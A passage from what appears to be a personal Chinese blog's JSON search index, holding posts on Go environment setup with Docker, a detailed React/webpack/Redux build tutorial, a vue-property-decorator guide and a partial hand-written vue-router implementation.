然后就像平常一样push代码，就会自动部署啦","categories":[],"tags":[{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"}]},{"title":"go环境配置","slug":"go使用笔记","date":"2021-01-17T06:06:45.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2021/01/17/go使用笔记/","link":"","permalink":"https://harrypangpang.github.io/2021/01/17/go%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","excerpt":"","text":"安装go go env -w GO111MODULE=auto //使用go 模块 go env -w GOPATH=“/Users/qiang.zhang/Documents/go_project” //修改工作目录 go env -w GOPROXY=“https://goproxy.cn,direct” //下载超时解决方案 mkdir bin pkg src go mod init maxcb //初始化mod 测试环境：go run *.go 编译: go build //go会自动下载包 docker 部署测试环境 redis: image: redis:alpine ports: - &quot;127.0.0.1:2306:6379&quot; mysql: image: percona:5.7 ports: - &quot;127.0.0.1:2307:3306&quot; environment: MYSQL_DATABASE: app MYSQL_USER: app MYSQL_PASSWORD: app MYSQL_ROOT_PASSWORD: app command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci web: build: . links: - redis:cache1 - mysql:db1 ports: - &quot;127.0.0.1:2308:80&quot; volumes: - .:/var/www/yourproject tty: true working_dir: /var/www/yourproject environment: - GO111MODULE=auto - GOPORT=80 # Use Alpine Go FROM golang:1.11.2-alpine a # Install Git RUN apk update &amp;&amp; apk upgrade &amp;&amp; \\ apk add --no-cache nginx git nginx-mod-http-geoip # Build the outyet command inside the container. # (You may fetch or manage dependencies here, # either manually or with a tool like &quot;godep&quot;.) RUN export GOPROXY=https://goproxy.io,direct RUN go get github.com/dgrijalva/jwt-go &amp;&amp; \\ go get github.com/go-redis/redis &amp;&amp; \\ go get github.com/go-sql-driver/mysql &amp;&amp; \\ go get github.com/gorilla/handlers &amp;&amp; \\ go get github.com/gorilla/mux &amp;&amp; \\ go get github.com/jinzhu/gorm &amp;&amp; \\ go get github.com/joho/godotenv &amp;&amp; \\ go get gopkg.in/mgo.v2 &amp;&amp; \\ go get gopkg.in/guregu/null.v3 &amp;&amp; \\ go get github.com/thedevsaddam/renderer &amp;&amp; \\ go get golang.org/x/sync/singleflight &amp;&amp; \\ go get gopkg.in/gomail.v2 &amp;&amp; \\ go get github.com/sirupsen/logrus &amp;&amp; \\ go get go.uber.org/zap","categories":[],"tags":[{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"}]},{"title":"前端工程化","slug":"react16配置","date":"2021-01-17T06:06:45.000Z","updated":"2023-02-20T06:46:49.569Z","comments":true,"path":"2021/01/17/react16配置/","link":"","permalink":"https://harrypangpang.github.io/2021/01/17/react16%E9%85%8D%E7%BD%AE/","excerpt":"","text":"前端工程化至上 目录 版本说明 目录结构 初始化项目 webpack react 配置loader(sass,jsx) 引入babel 使用HtmlWebpackPlugin 使用webpack-dev-server 多入口页面配置 ref=“http://www.imooc.com/article/details/id/291278#entry”&gt;如何理解entry point(bundle),chunk,module 多入口页面html配置 redux 使用react-router 使用redux-thunk 模块热替换（Hot Module Replacement） 使用ESLint 使用axios和async/await Code Splitting 使用CommonsChunkPlugin 版本说明 由于构建相关例如webpack，babel，react-router等更新的较快，所以本文档以下面各种模块的版本号为主，各位安装的时候需要注意一下或者可以直接执行npm i将模块都安装好。 “dependencies”: { “babel-core”: “^6.26.3”, “babel-eslint”: “^8.2.3”, “babel-loader”: “^7.1.4”, “babel-plugin-transform-async-to-generator”: “^6.24.1”, “babel-plugin-transform-runtime”: “^6.23.0”, “babel-preset-es2015”: “^6.24.1”, “babel-preset-react”: “^6.24.1”, “babel-preset-stage-0”: “^6.24.1”, “babel-preset-stage-3”: “^6.24.1”, “css-loader”: “^0.28.11”, “eslint”: “^4.19.1”, “eslint-loader”: “^2.0.0”, “eslint-plugin-react”: “^7.9.1”, “file-loader”: “^1.1.11”, “history”: “^4.7.2”, “html-webpack-plugin”: “^3.2.0”, “react”: “^16.6.0”, “react-dom”: “^16.6.0”, “react-hot-loader”: “^4.3.12”, “react-redux”: “^6.0.0”, “react-router”: “^4.3.1”, “react-router-dom”: “^4.3.1”, “redux”: “^4.0.1”, “sass-loader”: “^7.0.3”, “style-loader”: “^0.21.0”, “url-loader”: “^1.0.1”, “webpack”: “^4.12.0”, “webpack-cli”: “^3.0.3”, “webpack-dev-server”: “^3.1.1” } 目录结构 开发和发布版本的配置文件是分开的，多入口页面的目录结构。 react-family/ | |──dist/ * 发布版本构建输出路径 | |──dev/ * 调试版本构建输出路径 | |──src/ * 工具函数 | | | |—— component/ * 各页面公用组件 | | | |—— page/ * 页面代码 | | |—— index/ * 页面代码 | | | |—— Main/ * 组件代码 | | | | |—— Main.jsx * 组件jsx | | | | |—— Main.scss * 组件css | | | | | |—— detail/ * 页面代码 | | | |—— static/ * 静态文件js，css | | |──webpack.config.build.js * 发布版本使用的webpack配置文件 |──webpack.config.dev.js * 调试版本使用的webpack配置文件 |──.eslint * eslint配置文件 |__.babelrc * babel配置文件 初始化项目 创建文件夹 mkdir react-family-bucket 初始化npm cd react-family-bucket npm init 如果有特殊需要，可以填入自己的配置，一路回车下来，会生成一个package.json，里面是你项目的基本信息，后面的npm依赖安装也会配置在这里。 webpack 安装webpack npm install webpack --save or npm install webpack --g –save是将当前webpack安装到react-family-bucket下的/node_modules。 –g是将当前webpack安装到全局下面，可以在node的安装目录下找到全局的/node_modules。 配置webopack配置文件 touch webpack.config.dev.js 新建一个app.js touch app.js 写入基本的webpack配置，可以参考这里： const path = require(‘path’); const srcRoot = ‘./src’; module.exports = { // 输入配置 entry: [ './app.js' ],, // 输出配置 output: &#123; path: path.resolve(__dirname, './dev'), filename: 'bundle.min.js' &#125;, }; 3, 执行webpack命令 如果是全局安装： webpack --config webpack.config.dev.js 如果是当前目录安装： ./node_modules/.bin/webpack --config webpack.config.dev.js 在package.json中添加执行命令： “scripts”: { “dev”: “./node_modules/.bin/webpack --config webpack.config.dev.js”, }, 执行npm run dev命令之后，会发现需要安装webpack-cli，（webpack4之后需要安装这个） npm install webpack-cli --save 去除WARNING in configuration警告,在webpack.config.dev.js增加一个配置即可： … mode: ‘development’ … 成功之后会在dev下面生成bundle.min.js代表正常。 如果想要动态监听文件变化需要在命令后面添加 --watch react 安装react npm install react react-dom --save 创建page目录和index页面文件： mkdir src mkdir page cd page 创建index mkdir index cd index &amp; touch index.js &amp; touch index.html index.js import ReactDom from ‘react-dom’; import Main from ‘./Main/Main.jsx’; ReactDom.render(, document.getElementById(‘root’)); index.html index 创建Main组件 import React from ‘react’; class Main extends React.Component { constructor(props) &#123; super(props); &#125; render() &#123; return (&lt;div&gt;Main&lt;/div&gt;); &#125; } export default Main; export 和 export default区别： export可以有多个 xx.js: export const test1 = ‘a’ export function test2() {} yy.js: import { test1, test2 } from ‘xx.js’; export default只能有1个 xx.js: let test1 = ‘a’; export default test1; yy.js: import test1 from ‘xx.js’; export 和 module.exports let exports = module.exports; 修改webpack配置入口文件 entry: [ path.resolve(srcRoot,‘./page/index/index.js’) ], 配置loader 处理样式文件需要这些loader: css-loader sass-loader style-loader npm install css-loader sass-loader style-loader file-loader --save 配置： module: { // 加载器配置 rules: [ { test: /.css/, use: ['style-loader', 'css-loader'], include: path.resolve(srcRoot)}, { test: /\\.scss/, use: [‘style-loader’, ‘css-loader’, ‘sass-loader’], include: path.resolve(srcRoot)} ] }, url-loader处理处理静态文件 npm install url-loader --save 配置： module: &#123; // 加载器配置 rules: [ &#123; test: /\\.(png|jpg|jpeg)$/, use: 'url-loader?limit=8192&amp;name=images/[name].[hash].[ext]', include: path.resolve(srcRoot)&#125; ] &#125;, limit:表示超过多少就使用base64来代替，单位是byte name:可以设置图片的路径，名称和是否使用hash 具体参考这里 引入babel bebel是用来解析es6语法或者是es7语法分解析器，让开发者能够使用新的es语法，同时支持jsx，vue等多种框架。 安装babel babel-core babel-loader npm install babel-core babel-loader --save 配置： module: { // 加载器配置 rules: [ { test: /.(js|jsx)$/, use: [{loader:‘babel-loader’}] ,include: path.resolve(srcRoot)}, ] }, babel配置文件：.babelrc touch .babelrc 配置： { “presets”: [ “es2015”, “react”, “stage-0” ], “plugins”: [] } babel支持自定义的预设(presets)或插件(plugins),只有配置了这两个才能让babel生效，单独的安装babel是无意义的 presets：代表babel支持那种语法(就是你用那种语法写)，优先级是从下往上,state-0|1|2|…代表有很多没有列入标准的语法回已state-x表示,参考这里 plugins:代表babel解析的时候使用哪些插件，作用和presets类似，优先级是从上往下。 依次安装： babel-preset-es2015 babel-preset-react babel-preset-stage-0 npm install babel-preset-es2015 babel-preset-react babel-preset-stage-0 --save babel-polyfill是什么？ 我们之前使用的babel，babel-loader 默认只转换新的 JavaScript 语法，而不转换新的 API。例如，Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise 等全局对象，以及一些定义在全局对象上的方法（比如 Object.assign）都不会转译。如果想使用这些新的对象和方法，必须使用 babel-polyfill，为当前环境提供一个垫片。 npm install --save babel-polyfill 使用： import “babel-polyfill”; transform-runtime有什么区别？ 当使用babel-polyfill时有一些问题： 默认会引入所有babel支持的新语法，这样就会导致你的文件代码非常庞大。 通过向全局对象和内置对象的prototype上添加方法来达成目的,造成全局变量污染。 这时就需要transform-runtime来帮我们有选择性的引入 npm install --save babel-plugin-transform-runtime 配置文件： { “plugins”: [ [“transform-runtime”, { “helpers”: false, “polyfill”: false, “regenerator”: true, “moduleName”: “babel-runtime” }] ] } 使用HtmlWebpackPlugin 记得我们之前新建的index.html么 我们执行构建命令之后并没有将index.html打包到dev目录下 我们需要HtmlWebpackPlugin来将我们output的js和html结合起来 npm install html-webpack-plugin --save 配置： const HtmlWebpackPlugin = require(‘html-webpack-plugin’); … plugins: [ new HtmlWebpackPlugin({ filename: path.resolve(devPath, ‘index.html’), template: path.resolve(srcRoot, ‘./page/index/index.html’), }) ] filename:可以设置html输出的路径和文件名 template:可以设置已哪个html文件为模版 更多参数配置可以参考这里 使用webpack-dev-server webpack-dev-server是一个小型的Node.js Express服务器,它使用webpack-dev-middleware来服务于webpack的包。 安装 npm install webpack-dev-server --save 修改在package.json中添加的执行命令： “scripts”: { “dev”: “./node_modules/.bin/webpack-dev-server --config webpack.config.dev.js”, }, 配置webpack配置文件： devServer: { “contentBase”: devPath, “compress”: true, }, contentBase 表示server文件的根目录 compress 表示开启gzip 更多的配置文档参考这里 webpack-dev-server默认情况下会将output的内容放在内存中，是看不到物理的文件的，如果想要看到物理的dev下面的文件可以安装write-file-webpack-plugin这个插件。 webpack-dev-server默认会开启livereload功能 devtool功能： 具体来说添加了devtool: 'inline-source-map’之后，利用source-map你在chrome控制台看到的source源码都是真正的源码，未压缩，未编译前的代码，没有添加，你看到的代码是真实的压缩过，编译过的代码，更多devtool的配置可以参考这里 多入口文件配置 在之前的配置中，都是基于单入口页面配置的，entry和output只有一个文件，但是实际项目很多情况下是多页面的，在配置多页面时，有2中方法可以选择： 在entry入口配置时，传入对象而不是单独数组,output时利用[name]关键字来区分输出文件例如： entry: { index: [path.resolve(srcRoot,‘./page/index/index1.js’),path.resolve(srcRoot,‘./page/index/index2.js’)], detail: path.resolve(srcRoot,‘./page/detail/detail.js’), home: path.resolve(srcRoot,‘./page/home/home.js’), }, output: { path: path.resolve(__dirname, ‘./dev’), filename: '[name].min.js' }, 通过node动态遍历需要entry point的目录，来动态生成entry： const pageDir = path.resolve(srcRoot, ‘page’); function getEntry() { let entryMap = {}; fs.readdirSync(pageDir).forEach((pathname)=&gt;&#123; let fullPathName = path.resolve(pageDir, pathname); let stat = fs.statSync(fullPathName); let fileName = path.resolve(fullPathName, 'index.js'); if (stat.isDirectory() &amp;&amp; fs.existsSync(fileName)) &#123; entryMap[pathname] = fileName; &#125; &#125;); return entryMap; } { … entry: getEntry() … } 本demo采用的是第二中写法，能够更加灵活。 如何理解entry point(bundle),chunk,module 在webpack中，如何理解entry point(bundle),chunk,module?先看看下图： 根据图上的表述，我这里简单说一下结论： 配置中每个文件例如index1.js,index2.js,detail.js,home.js都属于entry point. entry这个配置中，每个key值,index,detail,home都相当于chunk。 我们在代码中的require或者import的都属于module，这点很好理解。 chunk的分类比较特别，有entry chunk,initial chunk,normal chunk,参考这个文章 正常情况下，一个chunk对应一个output,在使用了CommonsChunkPlugin或者require.ensure之后，chunk就变成了initial chunk,normal chunk，这时，一个chunk对应多个output。 理解这些概念对于后续使用webpack插件有很大的帮助。 多入口页面html配置 之前我们配置HtmlWebpackPlugin时，同样采用的是但页面的配置，这里我们将进行多页面改造,entryMap是上一步得到的entry： function htmlAarray(entryMap) { let htmlAarray = []; Object.keys(entryMap).forEach(function(key)&#123; let fullPathName = path.resolve(pageDir, key); let fileName = path.resolve(fullPathName, key + '.html') if (fs.existsSync(fileName)) &#123; htmlAarray.push(new HtmlWebpackPlugin(&#123; chunks: key, // 注意这里的key就是chunk filename: key + '.html', template: fileName, inlineSource: '.(js|css)' &#125;)) &#125; &#125;); return htmlAarray; } 修改plugin配置： plugins: [ … ].concat(htmlMap) redux 关于redux的使用可以参考阮一峰老师的入门教程 安装redux redux react-redux npm install redux react-redux --save 新建reducers，actions目录和文件 |—— index/ |—— Main/ * 组件代码 | |—— Main.jsx * 组件jsx | |—— Main.scss * 组件css | |—— actions/ | |—— actionTypes.js * action常量 | |—— todoAction.js * action | |—— reducers/ | |—— todoReducer.js * reducer | |—— main.js * 将所有reducer进行combin，store.js只引入这个 | |—— store.js | |—— index.js 修改代码，引入redux,这里以一个redux todo为demo例子： index.js import ReactDom from ‘react-dom’; import React from ‘react’; import Main from ‘./Main/Main.jsx’; import store from ‘./store.js’; import { Provider } from ‘react-redux’; ReactDom.render( , document.getElementById(‘root’)); store.js import { createStore } from ‘redux’; import todoReducer from ‘./reducers/todoReducer.js’; const store = createStore(todoReducer); export default store; tabReducer.js import { ADD_TODO } from ‘…/actions/actionTypes.js’; const initialState = { todoList: [] }; const addTodo = (state, action) =&gt; { return { …state, todoList: state.todoList.concat(action.obj) } } const todoReducer = (state = initialState, action) =&gt; { switch(action.type) { case ADD_TODO: return addTodo(state, action); default: return state; } }; export default todoReducer; Main.jsx import React from ‘react’; import { connect } from ‘react-redux’; import { addTodo } from ‘…/actions/todoAction.js’; class Main extends React.Component { onClick()&#123; let text = this.refs.input; this.props.dispatch(addTodo(&#123; text: text.value &#125;)) &#125; render() &#123; return ( &lt;div&gt; &lt;input ref=&quot;input&quot; type=&quot;text&quot;&gt;&lt;/input&gt; &lt;button onClick=&#123;()=&gt;this.onClick()&#125;&gt;提交&lt;/button&gt; &lt;ul&gt; &#123;this.props.todoList.map((item, index)=&gt;&#123; return &lt;li key=&#123;index&#125;&gt;&#123;item.text&#125;&lt;/li&gt; &#125;)&#125; &lt;/ul&gt; &lt;/div&gt; ); &#125; } export default connect( state =&gt; ({ todoList: state.todoList }) )(Main); todoAction.js import { ADD_TODO } from ‘./actionTypes.js’; export const addTodo = (obj) =&gt; { return { type: ADD_TODO, obj: obj }; }; 使用react-router react-router强大指出在于方便代码管理，结合redux使用更加强大，同时支持web，native更多参考这里 安装react-router-dom npm install react-router-dom --save 如果项目中用了redux，可以安装connected-react-router npm install connected-react-router history --save 修改代码： index.js: import ReactDom from ‘react-dom’; import React from ‘react’; import Container from ‘./Main/Container.jsx’; import { store, history } from ‘./store.js’; import { Provider } from ‘react-redux’; import { ConnectedRouter } from ‘connected-react-router’; ReactDom.render( , document.getElementById(‘root’)); 结合history,react-router一共有3中不同的router： BrowserRouter通过history/createBrowserHistory引入:当切换时，url会动态更新，底层使用的时html5的pushState。 HashRouter通过history/createHashHistory引入:当切换时，动态修改hash，利用hashchange事件。 MemoryRouter通过history/createMemoryHistory引入:将路径，路由相关数据存入内存中，不涉及url相关更新，兼容性好。 更多配置可以参考这里 如果想要在代码逻辑中获取当前的route的location信息需要在main.js中添加router的reducer: 新建main.js: import { combineReducers } from ‘redux’; import { connectRouter } from ‘connected-react-router’ import todoReducer from ‘./todoReducer.js’; const reducers = (history) =&gt; combineReducers({ todoReducer, router: connectRouter(history) }); export default reducers; 编写store.js: import { createStore } from ‘redux’; import mainReducer from ‘./reducers/main.js’; import createHistory from ‘history/createHashHistory’; export const history = createHistory(); const store = createStore( createRootReducer(history), ); export default store; 然后就可以在this.props.router里面获取到相关的location路径信息，其实就是将router对象放在组件的props里面。 如果需要自己通过dispatch一个action来触发router的跳转，需要引入routerMiddleware: import { createStore,applyMiddleware,compose } from ‘redux’; import mainReducer from ‘./reducers/main.js’; import createHistory from ‘history/createHashHistory’; import { routerMiddleware } from “connected-react-router”; export const history = createHistory(); const store = createStore( createRootReducer(history), compose(applyMiddleware(routerMiddleware(history))) ); export default store; 最后，将改动同步在index.js长这样： index.js: import ReactDom from ‘react-dom’; import React from ‘react’; import Container from ‘./Main/Container.jsx’; import store, { history } from ‘./store.js’; import { Provider } from ‘react-redux’; import { ConnectedRouter } from ‘connected-react-router’; ReactDom.render( , document.getElementById(‘root’)); 看到这里，大家可能会对react-router，react-router-dom，connected-react-router，history这些东西给搞晕了，在这里解释一下： react-router：是react-router的核心逻辑，并不涉及到UI，必须引入。 react-router-dom：是react-router的DOM绑定模块，只有用了react-router-dom才能用类似,这些组件，必须引入。 history：是一个让你灵活控制或者模拟浏览器的历史操作的一个库，包括BrowserHistory，HashHistory，MemoryHistory，他可以脱离React使用，也可以结合React使用，可选引入。 connected-react-router：简单来说就是你的项目如果用的React和Redux，如果想要用router的话就可以引入connected-react-router，它能帮你把router的状态放在store里来管理(注意根据你使用的react-router版本不同，会使用不同的版本，它的前身是react-router-redux，官方已经不再维护了)，可选引入。 使用Route和Link和withRouter: 先说说都是干嘛的： Route:component里面的内容即是tab的主要内容，这个从react-router4开始生效： Link:通常也可以用NavLink，相当于tab按钮，控制router的切换,activeClass表示当前tab处于激活态时应用上的class。 withRouter:如果你用了redux，那么你一定要引入它。 export default withRouter(connect( state =&gt; ({ todoList: state.todoReducer.todoList }) )(Main)); 如果你在使用hash时遇到Warning: Hash history cannot PUSH the same path; a new entry will not be added to the history stack错误，可以将push改为replace即 切换到2号 设置初始化路由： BrowserRouter和HashRouter: const history = createHistory(); history.push(‘2’); MemoryRouter: const history = createMemoryHistory({ initialEntries: [‘/2’] }); 使用redux-thunk redux-thunk 是一个比较流行的 redux 异步 action 中间件，比如 action 中有 setTimeout 或者通过 fetch通用远程 API 这些场景，那么久应该使用 redux-thunk 了。redux-thunk 帮助你统一了异步和同步 action 的调用方式，把异步过程放在 action 级别解决，对 component 没有影响。 安装redux-thunk: npm install redux-thunk --save 修改store.js: import { createStore,applyMiddleware } from ‘redux’; import thunk from ‘redux-thunk’; import mainReducer from ‘./reducers/main’; … const store = createStore(mainReducer, applyMiddleware(thunk)); … export default store; 在action.js使用redux-thunk： export const getData = (obj) =&gt; (dispatch, getState) =&gt; { setTimeout(()=&gt;{ dispatch({ type: GET_DATA, obj: obj }); },1000); }; 模块热替换（Hot Module Replacement） 模块热替换(Hot Module Replacement 或 HMR)是 webpack 提供的最有用的功能之一。它允许在运行时更新各种模块，而无需进行完全刷新,很高大上有木有！ 下面说一下配置方法，它需要结合devServer使用： devServer: { hot: true // 开启HMR }, 开启plugin： const webpack = require(‘webpack’); plugins: [ new webpack.NamedModulesPlugin(), new webpack.HotModuleReplacementPlugin(), ].concat(htmlMap) 结合React一起使用： 安装react-hot-loader, npm install react-hot-loader --save 并新建一个Container.jsx: import React from ‘react’; import Main from ‘./Main.jsx’; import { hot } from ‘react-hot-loader’ class Container extends React.Component { render() &#123; return &lt;Main /&gt; &#125; } export default hot(module)(Container); 结合redux：如果项目没有使用redux，可以无需配置后面2步 修改store.js新增下面代码，为了让reducer也能实时热替换 if (module.hot) { module.hot.accept(‘./reducers/todoReducer.js’, () =&gt; { const nextRootReducer = require(‘./reducers/todoReducer.js’).default; store.replaceReducer(nextRootReducer); }); } 修改index.js import ReactDom from ‘react-dom’; import React from ‘react’; import Container from ‘./Main/Container.jsx’; import store from ‘./store.js’; import { Provider } from ‘react-redux’; ReactDom.render( , document.getElementById(‘root’)); 当控制台看到[WDS] Hot Module Replacement enabled.代表开启成功 使用ESLint ESLint 是众多 Javascript Linter 中的其中一种，其他比较常见的还有 JSLint 跟 JSHint，之所以用 ESLint 是因为他可以自由选择要使用哪些规则，也有很多现成的 plugin 可以使用，另外他对 ES6 还有 JSX 的支持程度跟其他 linter 相比之下也是最高的。 安装ESLint npm install eslint eslint-loader babel-eslint --save 其中eslint-loader是将webpack和eslint结合起来在webpack的配置文件中新增一个eslint-loader种，修改如下 { test: /.(js|jsx)$/, use: [{loader:‘babel-loader’},{loader:‘eslint-loader’}] ,include: path.resolve(srcRoot)}, 新建.eslintrc配置文件,将parser配置成babel-eslint { “extends”: [“eslint:recommended”], &quot;parser&quot;: &quot;babel-eslint&quot;, &quot;globals&quot;: &#123; &#125;, &quot;rules&quot;: &#123; &#125; } 安装eslint-plugin-react: npm install eslint-plugin-react --save 说明一下，正常情况下每个eslint规则都是需要在rule下面配置，如果什么都不配置，其实本身eslint是不生效的。 eslint本身有很多默认的规则模版，可以通过extends来配置，默认可以使用eslint:recommended。 在使用react开发时可以安装eslint-plugin-react来告知使用react专用的规则来lint 修改.eslintrc配置文件,增加rules，更多rules配置可以参考这里 { “extends”: [“eslint:recommended”,“plugin:react/recommended”], &quot;parser&quot;: &quot;babel-eslint&quot;, &quot;globals&quot;: &#123; &quot;window&quot;: true, &quot;document&quot;: true, &quot;module&quot;: true, &quot;require&quot;: true &#125;, &quot;rules&quot;: &#123; &quot;react/prop-types&quot; : &quot;off&quot;, &quot;no-console&quot; : &quot;off&quot; &#125; } 使用axios和async/await axios 是一个基于Promise 用于浏览器和 nodejs 的 HTTP 客户端： 从浏览器中创建 XMLHttpRequest 从 node.js 发出 http 请求 支持 Promise API 自动转换JSON数据 安装axios: npm install axios --save 在action中使用axios： import axios from ‘axios’; export const getData = (obj) =&gt; (dispatch, getState) =&gt; { axios.get(‘/json/comments.json’).then((resp)=&gt;{ dispatch({ type: GET_DATA, obj: resp }); }); }; async/await： Javascript的回调地狱，相信很多人都知道，尤其是在node端，近些年比较流行的是Promise的解决方案，但是随着 Node 7 的发布，编程终级解决方案的 async/await应声而出。 function resolveAfter2Seconds() { return new Promise(resolve =&gt; { setTimeout(() =&gt; { resolve(‘resolved’); }, 2000); }); } async function asyncCall() { var result = await resolveAfter2Seconds(); } asyncCall(); async/await的用途是简化使用 promises 异步调用的操作，并对一组 Promises执行某些操作。await前提是方法返回的是一个Promise对象，正如Promises类似于结构化回调，async/await类似于组合生成器和 promises。 async/await需要安装babel-plugin-transform-async-to-generator。 npm install babel-plugin-transform-async-to-generator --save 在.babelrc中增加配置： “plugins”: [ “transform-async-to-generator” ] 这样做仅仅是将async转换generator，如果你当前的浏览器不支持generator，你将会收到一个Uncaught ReferenceError: regeneratorRuntime is not defined的错误，你需要： 安装babel-plugin-transform-runtime: npm install babel-plugin-transform-async-to-generator --save 修改.babelrc中的配置(可以去掉之前配置的transform-async-to-generator)： “plugins”: [ “transform-runtime” ] 如果不想引入所有的polyfill(参考上面对babel的解释),可以增加配置： “plugins”: [ “transform-runtime”, { “polyfill”: false, &quot;regenerator&quot;: true, &#125; ] 结合axios使用： import axios from ‘axios’; export const getData = (obj) =&gt; async (dispatch, getState) =&gt; { let resp = axios.get(‘/json/comments.json’); dispatch({ type: GET_DATA, obj: resp }); }; Code Splitting 对于webpack1，2之前，你可以使用require.ensure来控制一个组件的懒加载： require.ensure([], _require =&gt; { let Component = _require(‘./Component.jsx’); },‘lazyname’) 在webpack4中，官方已经不再推荐使用require.ensure来使用懒加载功能Dynamic Imports，取而代之的是ES6的import()方法： import( /* webpackChunkName: “my-chunk-name” / / webpackMode: “lazy” */ ‘module’ ); 不小小看注释里的代码，webpack在打包时会动态识别这里的代码来做相关的配置，例如chunk name等等。 3. Prefetching/Preloading modules: webpack 4.6.0+支持了Prefetching/Preloading的写法: //… import(/* webpackPreload: true */ ‘ChartingLibrary’); 结合React-Router使用: react-loadable对上述的功能做了封装，丰富了一些功能，结合React-Router起来使用更加方便。 npm install react-loadable --save 在react-router里使用： function Loading() { return Loading…; } let Div2 = Loadable({ loader: () =&gt; import(‘./Div2’), loading: Loading, }); 使用CommonsChunkPlugin CommonsChunkPlugin 插件，是一个可选的用于建立一个独立文件(又称作 chunk)的功能，这个文件包括多个入口 chunk 的公共模块。通过将公共模块拆出来，最终合成的文件能够在最开始的时候加载一次，便存起来到缓存中供后续使用。 在webpack4之前的用法： new webpack.optimize.CommonsChunkPlugin({ name: ‘common’, chunks: [‘page1’,‘page2’], minChunks: 3 }) name: string: 提出出的名称 chunks: string[]: webpack会从传入的chunk里面提取公共代码,默认从所有entry里提取 minChunks: number|infinity|function(module,count)-&gt;boolean: 如果传入数字或infinity(默认值为3)，就是告诉webpack，只有当模块重复的次数大于等于该数字时，这个模块才会被提取出来。当传入为函数时，所有符合条件的chunk中的模块都会被传入该函数做计算，返回true的模块会被提取到目标chunk。 更多的参数配置，可以参考这里 在webpack4之后的用法： module.exports = { //… optimization: { splitChunks: { chunks: ‘async’, minSize: 30000, minChunks: 1, maxAsyncRequests: 5, maxInitialRequests: 3, automaticNameDelimiter: ‘~’, name: true, cacheGroups: { vendors: { test: /[\\/]node_modules[\\/]/, priority: -10 }, default: { minChunks: 2, priority: -20, reuseExistingChunk: true } } } } }; splitChunks: 配置一个分离chunk(代替老版本的CommonsChunkPlugin) cacheGroups: 自定义配置主要使用它来决定生成的文件: test: 限制范围 name: 生成文件名 priority: 优先级 minSize: number: 最小尺寸必须大于此值，默认30000B minChunks: 其他entry引用次数大于此值，默认1 maxInitialRequests: entry文件请求的chunks不应该超过此值（请求过多，耗时） maxAsyncRequests: 异步请求的chunks不应该超过此值 automaticNameDelimiter: 自动命名连接符 chunks: 值为&quot;initial&quot;, “async”（默认） 或 “all”: initial: 入口chunk，对于异步导入的文件不处理 async: 异步chunk，只对异步导入的文件处理 all: 全部chunk","categories":[],"tags":[{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"}]},{"title":"vue-property-decorator使用指南","slug":"vue-property-decorator使用指南","date":"2021-01-17T06:06:45.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2021/01/17/vue-property-decorator使用指南/","link":"","permalink":"https://harrypangpang.github.io/2021/01/17/vue-property-decorator%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","excerpt":"","text":"vue-property-decorator使用指南 vue-property-decorator是在你构建vue项目时选择class风格时使用的组件 一共有这么多属性： @Prop @PropSync @Model @Watch @Provide @Inject @ProvideReactive @InjectReactive @Emit @Ref @Component 这里只介绍常见的几种使用方法 @Component @Component其实是vue-class-component插件提供的，但我们使用时，仍然可以采用下面的方法：&lt;template&gt; &lt;div class=&quot;home&quot;&gt; &lt;img alt=&quot;Vue logo&quot; src=&quot;../assets/logo.png&quot; /&gt; &lt;div&gt;&#123;&#123;title&#125;&#125;&lt;/div&gt; &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot; /&gt; &lt;/div&gt; &lt;/template&gt; &lt;script lang=&#x27;ts&#x27;&gt; import &#123; Component, Prop, Vue &#125; from &#x27;vue-property-decorator&#x27;; import HelloWorld from &#x27;@/uiFeatures/HelloWorld.vue&#x27;; // 组件注册 @Component(&#123; components: &#123; HelloWorld, &#125;, &#125;) export default class Home extends Vue &#123; // 这里是为了防止this.$toast报错，暂时还没想到别的处理方法 $toast:any // 这里就是data属性 title:String = &#x27;title&#x27; created() &#123; this.$toast(&#123; msg: &#x27;This is Toast&#x27;, visable: true, &#125;); &#125; &#125; &lt;/script&gt;","categories":[],"tags":[{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"}]},{"title":"vue-router实现","slug":"vue-router简单实现","date":"2021-01-17T06:06:45.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2021/01/17/vue-router简单实现/","link":"","permalink":"https://harrypangpang.github.io/2021/01/17/vue-router%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"vue-router实现 import Home from &quot;@/views/Home.vue&quot;; import Vue from &quot;vue&quot;; class VueRouter &#123; [x: string]: any; constructor(options: object) &#123; this.$options = options; this.routeMap = &#123;&#125;; //挂在vue data上识别当前路由 this.app = new Vue(&#123; data: &#123; current: &quot;/&quot; &#125; &#125;); &#125; static install: (Vue: any) =&gt; void; init() &#123; this.bindEvent(); //监听路由变化 this.createRouteMap(); //构建路由键值对 this.initComponent(); //初始化router 的组件 &#125; bindEvent() &#123; window.addEventListener(&quot;load&quot;, this.onHashChange.bind(this)); window.addEventListener(&quot;hashchange&quot;, this.onHashChange.bind(this)); &#125; // hash变化时 onHashChange() &#123; // 当前全局状态 current 就是目前hash对象的名称 this.app.current = window.location.hash.slice(1) || &quot;/&quot;; &#125; createRouteMap() &#123; // 构建键值对以便找到模版 this.$options.routes.forEach((ele: object) =&gt; &#123; this.routeMap[ele.path] = ele.component; &#125;); &#125; initComponent() &#123; // router-link,router-view // &lt;router-link to=&quot;&quot;&gt;fff&lt;/router-link&gt; Vue.component(&quot;router-link&quot;, &#123; props: &#123; to: String &#125;, render(h) &#123; // h就是createElement 来创建VNode // h(tag, data, children) return h(&quot;a&quot;, &#123; attrs: &#123; href: &quot;#&quot; + this.to &#125; &#125;, [ this.$slots.default ]); &#125; &#125;); // &lt;router-view&gt;&lt;/router-view&gt; Vue.component(&quot;router-view&quot;, &#123; render: h =&gt; &#123; const comp = this.routeMap[this.app.current]; return h(comp); &#125; &#125;); 